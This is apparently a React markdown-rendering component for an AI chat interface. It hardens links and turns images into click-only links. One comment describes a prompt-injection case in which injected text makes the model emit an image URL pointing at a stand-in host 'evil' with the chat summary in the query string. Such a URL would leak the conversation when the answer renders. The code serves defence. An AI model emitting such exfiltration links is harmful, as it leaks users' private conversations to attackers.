import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

// Model output is untrusted: it can repeat whatever a pasted text told it to.
// Raw HTML is not rendered and javascript: links are dropped (react-markdown defaults).
const components: Components = {
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
      {children}
    </a>
  ),
  // Images are never loaded. An injected instruction like "add ![](https://evil/?q=<chat summary>)"
  // would otherwise leak the conversation the moment the answer renders. A link needs a click.
  img: ({ src, alt }) =>
    typeof src === 'string' && src ? (
      <a href={src} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
        {`Картинка: ${alt || src}`}
      </a>
    ) : null,
  table: ({ children }) => (
    <div className="table-scroll">
      <table>{children}</table>
    </div>
  ),
}

export function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {text}
    </ReactMarkdown>
  )
}
